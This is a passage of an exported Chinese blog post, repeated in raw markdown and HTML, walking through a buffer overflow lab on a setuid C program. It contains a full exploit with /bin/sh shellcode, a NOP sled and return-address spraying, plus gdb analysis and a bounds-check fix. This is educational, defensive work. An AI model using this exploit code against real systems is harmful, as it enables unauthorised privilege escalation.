}\n```\n上边这些代码首先使用get_addr_of_ret_addr()获取当前程序返回地址的存放地址，然后用gap来存放返回地址和search_buffer的空间大小。如果输入的长度大于该长度，就输出提示，同时程序停止。\n\n修补后的实验结果如下：\n![result.png](/image/Stackoverflow/9.png)\n修补程序成功。","source":"_posts/Stackoverflow.md","raw":"title: Stackoverflow\ndate: 2015-03-05 19:28:28\ntags: IS\ncategories: IS\n---\n说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。\n<!--more-->\n当然最开始要放上来的还是有漏洞的程序。为了节省篇幅，仅仅把主函数粘上来，也就是我们有漏洞的地方。程序如下：\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include \"common.h\"\n\nint main(int argc, char *argv[]) {\n  uid_t userid = getuid();\n  int printing = 1;\n  int fd;\n  char search_buffer[100];\n\n  if (argc > 1) {\n    strcpy(search_buffer, argv[1]);\n  } else {\n    search_buffer[0] = '\\0'; // Null byte - empty string\n  }\n\n  fd = open(NOTE_FILE, O_RDONLY);\n  if (fd == -1) {\n    fatal(\"Problem opening file in main()\");\n  }\n  while(printing) {\n    printing = print_notes(fd, userid, search_buffer);\n  }\n  printf(\"--------[ END OF DATA ]--------\\n\");\n  close(fd);\n\n  return 0;\n}\n```\n##程序攻击##\n\n学过信息安全的大约都能看出来，中间strcpy函数复制的时候没有检查输入参数的边界。因此只要输入的稍微长点的参数，就会产生溢出。接下来我们就在ubuntu 下做一下这个实验吧。\n先说一下基本原理吧。在每个函数的特定位置，存放着该函数的返回地址。这个返回地址可能会被有溢出漏洞的数组，函数覆盖。如果这个返回地址被用新的地址覆盖了，而且新的地址指向我们另外一段程序，那样的话我们就可以通过这个程序获得更高的权限了。\n第一步，编译程序。截图如下：\n![com.png](/image/Stackoverflow/2.png)\n编译这一步必须做对了。不然就不能继续下去。下面我解释一下这几个有关参数：\n```\ngcc -o searchnote -z execstack -fno-stack-protector -g searchnote.c\n```\n这句代码是这样的。在现代编译器中，gcc会对很多安全问题进行处理。比方说禁止数据堆栈区的程序运行，缓冲区溢出处理等等。一旦gcc处理了这些问题，我们的缓冲区溢出攻击也就没办法继续下去了。\n这里 -z execstack 就是用来告诉编译器栈上的程序是可以运行的。 -fno-stack-protector 是用来禁用堆栈溢出保护的。这样下去之后，就可以运行下一步了。\n**PS:gcc4.6以上好像这两句代码不好使了，堆栈保护一直关不掉。最后我只好使用gdb继续进行试验了**\n第二步，设计我们的攻击程序。程序代码如下：\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\"\n;\n#define OFFSET 500\n\nunsigned long getESP(){\n    __asm__(\"movl %ESP,%EAX\");\n}\n// This code builds the malicious input required to trigger our buffer overflow,and then\n// invokes the searchnote binary with it. Once finished, this code should yield a root shell.\nint main(int argc, char *argv[]) {\nchar *command, *buffer;\nunsigned long addr;\naddr = getESP() + OFFSET;\ncommand = calloc(2000, sizeof(char));\nfprintf(stderr, \"Using Offset: 0x%x\\nShellcode Size:%d\\n\",addr,sizeof(shellcode));\nstrcpy(command, \"./searchnote \\'\"); // start command buffer\nbuffer = command + strlen(command); // set buffer at the end\n// fill buffer with enough copies of an address within the NOP sled to overwrite the return address\nmemset(buffer,0x90,1024);\n// append suitably long NOP sled to give a large enough target for the previous part to work reliably\n\nint i;\nfor(i = 0;i < 200;i += 4){\nbuffer[i] = addr & 0x000000ff;\nbuffer[i + 1] = (addr & 0x0000ff00) >> 8; \nbuffer[i + 2] = (addr & 0x00ff0000) >> 16;\nbuffer[i + 3] = (addr & 0xff000000) >> 24;\n}\n\nmemcpy(buffer + 900,shellcode,sizeof(shellcode));\n\n// append our shellcode to buffer\nstrcat(command, \"\\'\");\nsystem(command); // run exploit\nfree(command);\n}\n\n```\n关键部分在这里\n![code1.png](/image/Stackoverflow/5.png)\n下面我解释一下这个代码。\n```\n#define OFFSET 500\n\nunsigned long getESP(){\n    __asm__(\"movl %ESP,%EAX\");\n}\nunsigned long addr;\naddr = getESP() + OFFSET;\n```\n这部分代码，我们用来得到当前堆栈的起始位置。OFFSET是我们猜测的偏移量。addr就是我们的shellcode的大概位置了。我们只要把shellcode附着在buffer的后边，然后让这个addr指向shellcode大概的前边就可以。这里我们用到一个东西叫做NOP sled。\nNOP sled就是当程序指针指导NOP的时候，它会继续往下寻找可执行程序。一直“滑”到可执行的程序位置。这样的话我们把shellcode的前边用0x90填充，在一大堆0x90(NOP)的包围下，addr只要指向shellcode前边的某个NOP即可，程序指针就会滑下去，滑到我们的shellcode然后执行。\n\n```\n// fill buffer with enough copies of an address within the NOP sled to overwrite the return address\nmemset(buffer,0x90,1024);\n```\n这一段代码就是用0x90来填充buffer，长度为1024.\n\n```\nint i;\nfor(i = 0;i < 200;i += 4){\nbuffer[i] = addr & 0x000000ff;\nbuffer[i + 1] = (addr & 0x0000ff00) >> 8; \nbuffer[i + 2] = (addr & 0x00ff0000) >> 16;\nbuffer[i + 3] = (addr & 0xff000000) >> 24;\n}\n\nmemcpy(buffer + 900,shellcode,sizeof(shellcode));\n\n```\n这一部分是这样，因为我们不确定存着函数返回地址的地址，我们就暴力的从buffer的开始，不断的用addr来填充所有的部分。一直填充到200个为止。由于返回地址的对齐，所以中间一定能覆盖到返回地址，指向addr。然后返回到这个addr之后一直沿着0x90滑下去。滑到shellcode就成功了。\n\n下边我们看一下具体攻击的情况。首先如下图：\n\n\n![setuid.png](/image/Stackoverflow/8.png)\nchmod就是另外一个技术，所谓setuid，也就是让别的用户运行这个程序享有某些权限。这里我们这么写之后，用另外一个新建用户\"eve\"执行程序，也就有了和程序创建用户一样的效果。\n我们用gdb对searchnote进行一下调试，观察一下内存的变化过程。\n\n\n![stack1.png](/image/Stackoverflow/3.png)\n这里我们看到，在运行strcpy之前，我们的内存数据是正常的。这个时候main的返回地址应该是在0xbffff250左右。具体哪个已经不重要了。因为在缓冲区覆盖完成之后，可能的位置已经全变成指向shellcode的位置了。在上图的下方，大片的地址已经被我们得到的addr地址，也就是指向我们shellcode的地址覆盖。这个地址是0xbffff45c。其实可以看出来我们猜测的偏移量的大了。大约在0xbffff2f0就可以写入了。但是由于我们中间全用0x90填充，返回指针一直会滑到我们的shellcode的位置。\n\n\n![stack2.png](/image/Stackoverflow/4.png)\n这张图片揭示了我们shellcode附近的情况。0xbffff45c也就是程序返回执行的位置，在前边隐去了。程序指针会顺着NOP sled 一直滑到shellcode复婚，也就是0xbffff5a0的位置。开始执行shellcode。\n\n\n![result.png](/image/Stackoverflow/1.png)\n运行完shellcode就是上边这个结果了。\n**PS:预期结果应该是获取root权限。但是由于程序创建者没有这个权限，同时ubuntu系统有bash的保护机制，导致没能获取root权限。这里我们仅仅获取了程序创建者的权限，但是这已经证明了我们成功的进行了缓冲区溢出攻击**\n\n##程序漏洞修补##\n程序修补比较简单，只要检查输入长度然后加以判断就好。关键代码如下：\n```\nstruct stack_frame {\n  struct stack_frame* next;\n  void* ret;\n};\n\nvoid ** get_addr_of_ret_addr() {\n  /* x86/gcc-specific: this tells gcc that the fp\n     variable should be set to the %ebp register\n     which keeps the frame pointer */\n  register struct stack_frame* fp asm(\"ebp\");\n  // the rest just walks through the linked list\n  struct stack_frame* frame = fp; // This is the stack frame of get_ebp\n  // Move down the stack to the stack frame which called get_ebp\n  frame = frame->next;\n  // We want to return the *address* of the retur address \n  return &frame->ret;\n}\n```\n上边这些代码的作用是获得当前函数的返回地址的存储地址。\n\n![code_fix.png](/image/Stackoverflow/6.png)\n\n```\n  char search_buffer[100];\n  void ** addr;\n  addr = get_addr_of_ret_addr();\n  int gap = (char *)addr - search_buffer;\n  printf(\"%d\\n\",strlen(argv[1])); \n  if(gap <= strlen(argv[1])){\n      printf(\"The args is too long\\n\");\n      return 0;\n  }\t\n  if (argc > 1) {\n    strcpy(search_buffer, argv[1]);\n  } else {\n    search_buffer[0] = '\\0'; // Null byte - empty string\n  }\n```\n上边这些代码首先使用get_addr_of_ret_addr()获取当前程序返回地址的存放地址，然后用gap来存放返回地址和search_buffer的空间大小。如果输入的长度大于该长度，就输出提示，同时程序停止。\n\n修补后的实验结果如下：\n![result.png](/image/Stackoverflow/9.png)\n修补程序成功。","slug":"Stackoverflow","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681v0001dwypdt6cvr189","content":"<p>说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。<br><a id=\"more\"></a><br>当然最开始要放上来的还是有漏洞的程序。为了节省篇幅，仅仅把主函数粘上来，也就是我们有漏洞的地方。程序如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"string\">\"common.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">uid_t</span> userid = getuid();</span><br><span class=\"line\">  <span class=\"keyword\">int</span> printing = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> search_buffer[<span class=\"number\">100</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (argc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(search_buffer, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    search_buffer[<span class=\"number\">0</span>] = <span class=\"string\">'\\0'</span>; <span class=\"comment\">// Null byte - empty string</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(NOTE_FILE, O_RDONLY);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    fatal(<span class=\"string\">\"Problem opening file in main()\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span>(printing) &#123;</span><br><span class=\"line\">    printing = print_notes(fd, userid, search_buffer);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"--------[ END OF DATA ]--------\\n\"</span>);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\"></span><br><span class=\"line\">  return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>##程序攻击##</p>\n<p>学过信息安全的大约都能看出来，中间strcpy函数复制的时候没有检查输入参数的边界。因此只要输入的稍微长点的参数，就会产生溢出。接下来我们就在ubuntu 下做一下这个实验吧。<br>先说一下基本原理吧。在每个函数的特定位置，存放着该函数的返回地址。这个返回地址可能会被有溢出漏洞的数组，函数覆盖。如果这个返回地址被用新的地址覆盖了，而且新的地址指向我们另外一段程序，那样的话我们就可以通过这个程序获得更高的权限了。<br>第一步，编译程序。截图如下：<br><img src=\"/image/Stackoverflow/2.png\" alt=\"com.png\"><br>编译这一步必须做对了。不然就不能继续下去。下面我解释一下这几个有关参数：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o searchnote -z execstack -fno-<span class=\"keyword\">stack</span>-protector -<span class=\"keyword\">g</span> searchnote.c</span><br></pre></td></tr></table></figure></p>\n<p>这句代码是这样的。在现代编译器中，gcc会对很多安全问题进行处理。比方说禁止数据堆栈区的程序运行，缓冲区溢出处理等等。一旦gcc处理了这些问题，我们的缓冲区溢出攻击也就没办法继续下去了。<br>这里 -z execstack 就是用来告诉编译器栈上的程序是可以运行的。 -fno-stack-protector 是用来禁用堆栈溢出保护的。这样下去之后，就可以运行下一步了。<br><strong>PS:gcc4.6以上好像这两句代码不好使了，堆栈保护一直关不掉。最后我只好使用gdb继续进行试验了</strong><br>第二步，设计我们的攻击程序。程序代码如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">char</span> shellcode[]=</span><br><span class=\"line\"><span class=\"string\">\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"</span></span><br><span class=\"line\"><span class=\"string\">\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"</span></span><br><span class=\"line\"><span class=\"string\">\"\\xe1\\xcd\\x80\"</span></span><br><span class=\"line\">;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OFFSET 500</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"title\">getESP</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">\"movl %ESP,%EAX\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// This code builds the malicious input required to trigger our buffer overflow,and then</span></span><br><span class=\"line\"><span class=\"comment\">// invokes the searchnote binary with it. Once finished, this code should yield a root shell.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">char</span> *command, *buffer;</span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> addr;</span><br><span class=\"line\">addr = getESP() + OFFSET;</span><br><span class=\"line\">command = <span class=\"built_in\">calloc</span>(<span class=\"number\">2000</span>, sizeof(char));</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Using Offset: 0x%x\\nShellcode Size:%d\\n\"</span>,addr,<span class=\"keyword\">sizeof</span>(shellcode));</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(command, <span class=\"string\">\"./searchnote \\'\"</span>); <span class=\"comment\">// start command buffer</span></span><br><span class=\"line\">buffer = command + <span class=\"built_in\">strlen</span>(command); <span class=\"comment\">// set buffer at the end</span></span><br><span class=\"line\"><span class=\"comment\">// fill buffer with enough copies of an address within the NOP sled to overwrite the return address</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(buffer,<span class=\"number\">0x90</span>,<span class=\"number\">1024</span>);</span><br><span class=\"line\"><span class=\"comment\">// append suitably long NOP sled to give a large enough target for the previous part to work reliably</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> i;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">200</span>;i += <span class=\"number\">4</span>)&#123;</span><br><span class=\"line\">buffer[i] = addr &amp; <span class=\"number\">0x000000ff</span>;</span><br><span class=\"line\">buffer[i + <span class=\"number\">1</span>] = (addr &amp; <span class=\"number\">0x0000ff00</span>) &gt;&gt; <span class=\"number\">8</span>; </span><br><span class=\"line\">buffer[i + <span class=\"number\">2</span>] = (addr &amp; <span class=\"number\">0x00ff0000</span>) &gt;&gt; <span class=\"number\">16</span>;</span><br><span class=\"line\">buffer[i + <span class=\"number\">3</span>] = (addr &amp; <span class=\"number\">0xff000000</span>) &gt;&gt; <span class=\"number\">24</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(buffer + <span class=\"number\">900</span>,shellcode,<span class=\"keyword\">sizeof</span>(shellcode));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// append our shellcode to buffer</span></span><br><span class=\"line\"><span class=\"built_in\">strcat</span>(command, <span class=\"string\">\"\\'\"</span>);</span><br><span class=\"line\">system(command); <span class=\"comment\">// run exploit</span></span><br><span class=\"line\"><span class=\"built_in\">free</span>(command);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关键部分在这里<br><img src=\"/image/Stackoverflow/5.png\" alt=\"code1.png\"><br>下面我解释一下这个代码。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OFFSET 500</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"title\">getESP</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">\"movl %ESP,%EAX\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> addr;</span><br><span class=\"line\">addr = getESP() + OFFSET;</span><br></pre></td></tr></table></figure></p>\n<p>这部分代码，我们用来得到当前堆栈的起始位置。OFFSET是我们猜测的偏移量。addr就是我们的shellcode的大概位置了。我们只要把shellcode附着在buffer的后边，然后让这个addr指向shellcode大概的前边就可以。这里我们用到一个东西叫做NOP sled。<br>NOP sled就是当程序指针指导NOP的时候，它会继续往下寻找可执行程序。一直“滑”到可执行的程序位置。这样的话我们把shellcode的前边用0x90填充，在一大堆0x90(NOP)的包围下，addr只要指向shellcode前边的某个NOP即可，程序指针就会滑下去，滑到我们的shellcode然后执行。</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//<span class=\"built_in\"> fill </span>buffer with enough copies of an address within the NOP sled to overwrite the<span class=\"built_in\"> return </span>address</span><br><span class=\"line\">memset(buffer,0x90,1024);</span><br></pre></td></tr></table></figure>\n<p>这一段代码就是用0x90来填充buffer，长度为1024.</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int i<span class=\"comment\">;</span></span><br><span class=\"line\">for(i = <span class=\"number\">0</span><span class=\"comment\">;i &lt; 200;i += 4)&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i] </span>= <span class=\"keyword\">addr </span>&amp; <span class=\"number\">0x000000ff</span><span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i </span>+ <span class=\"number\">1</span>] = (<span class=\"keyword\">addr </span>&amp; <span class=\"number\">0x0000ff00</span>) &gt;&gt; <span class=\"number\">8</span><span class=\"comment\">; </span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i </span>+ <span class=\"number\">2</span>] = (<span class=\"keyword\">addr </span>&amp; <span class=\"number\">0x00ff0000</span>) &gt;&gt; <span class=\"number\">16</span><span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i </span>+ <span class=\"number\">3</span>] = (<span class=\"keyword\">addr </span>&amp; <span class=\"number\">0xff000000</span>) &gt;&gt; <span class=\"number\">24</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">memcpy(<span class=\"keyword\">buffer </span>+ <span class=\"number\">900</span>,<span class=\"keyword\">shellcode,sizeof(shellcode));</span></span><br></pre></td></tr></table></figure>\n<p>这一部分是这样，因为我们不确定存着函数返回地址的地址，我们就暴力的从buffer的开始，不断的用addr来填充所有的部分。一直填充到200个为止。由于返回地址的对齐，所以中间一定能覆盖到返回地址，指向addr。然后返回到这个addr之后一直沿着0x90滑下去。滑到shellcode就成功了。</p>\n<p>下边我们看一下具体攻击的情况。首先如下图：</p>\n<p><img src=\"/image/Stackoverflow/8.png\" alt=\"setuid.png\"><br>chmod就是另外一个技术，所谓setuid，也就是让别的用户运行这个程序享有某些权限。这里我们这么写之后，用另外一个新建用户”eve”执行程序，也就有了和程序创建用户一样的效果。<br>我们用gdb对searchnote进行一下调试，观察一下内存的变化过程。</p>\n<p><img src=\"/image/Stackoverflow/3.png\" alt=\"stack1.png\"><br>这里我们看到，在运行strcpy之前，我们的内存数据是正常的。这个时候main的返回地址应该是在0xbffff250左右。具体哪个已经不重要了。因为在缓冲区覆盖完成之后，可能的位置已经全变成指向shellcode的位置了。在上图的下方，大片的地址已经被我们得到的addr地址，也就是指向我们shellcode的地址覆盖。这个地址是0xbffff45c。其实可以看出来我们猜测的偏移量的大了。大约在0xbffff2f0就可以写入了。但是由于我们中间全用0x90填充，返回指针一直会滑到我们的shellcode的位置。</p>\n<p><img src=\"/image/Stackoverflow/4.png\" alt=\"stack2.png\"><br>这张图片揭示了我们shellcode附近的情况。0xbffff45c也就是程序返回执行的位置，在前边隐去了。程序指针会顺着NOP sled 一直滑到shellcode复婚，也就是0xbffff5a0的位置。开始执行shellcode。</p>\n<p><img src=\"/image/Stackoverflow/1.png\" alt=\"result.png\"><br>运行完shellcode就是上边这个结果了。<br><strong>PS:预期结果应该是获取root权限。但是由于程序创建者没有这个权限，同时ubuntu系统有bash的保护机制，导致没能获取root权限。这里我们仅仅获取了程序创建者的权限，但是这已经证明了我们成功的进行了缓冲区溢出攻击</strong></p>\n<p>##程序漏洞修补##<br>程序修补比较简单，只要检查输入长度然后加以判断就好。关键代码如下：<br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span> &#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span>* next;</span><br><span class=\"line\">  void* ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void ** get_addr_of_ret_addr() &#123;</span><br><span class=\"line\">  <span class=\"comment\">/* x86/gcc-specific: this tells gcc that the fp</span><br><span class=\"line\">     variable should be set to the %ebp register</span><br><span class=\"line\">     which keeps the frame pointer */</span></span><br><span class=\"line\">  register <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span>* fp asm(<span class=\"string\">\"ebp\"</span>);</span><br><span class=\"line\">  <span class=\"comment\">// the rest just walks through the linked list</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span>* frame = fp; <span class=\"comment\">// This is the stack frame of get_ebp</span></span><br><span class=\"line\">  <span class=\"comment\">// Move down the stack to the stack frame which called get_ebp</span></span><br><span class=\"line\">  frame = frame-&gt;next;</span><br><span class=\"line\">  <span class=\"comment\">// We want to return the *address* of the retur address </span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &amp;frame-&gt;ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上边这些代码的作用是获得当前函数的返回地址的存储地址。</p>\n<p><img src=\"/image/Stackoverflow/6.png\" alt=\"code_fix.png\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> search_buffer[<span class=\"number\">100</span>];</span><br><span class=\"line\"><span class=\"keyword\">void</span> ** addr;</span><br><span class=\"line\">addr = get_addr_of_ret_addr();</span><br><span class=\"line\"><span class=\"keyword\">int</span> gap = (char *)addr - search_buffer;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,<span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>])); </span><br><span class=\"line\"><span class=\"keyword\">if</span>(gap &lt;= <span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>]))&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"The args is too long\\n\"</span>);</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;\t</span><br><span class=\"line\"><span class=\"keyword\">if</span> (argc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(search_buffer, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  search_buffer[<span class=\"number\">0</span>] = <span class=\"string\">'\\0'</span>; <span class=\"comment\">// Null byte - empty string</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上边这些代码首先使用get_addr_of_ret_addr()获取当前程序返回地址的存放地址，然后用gap来存放返回地址和search_buffer的空间大小。如果输入的长度大于该长度，就输出提示，同时程序停止。</p>\n<p>修补后的实验结果如下：<br><img src=\"/image/Stackoverflow/9.png\" 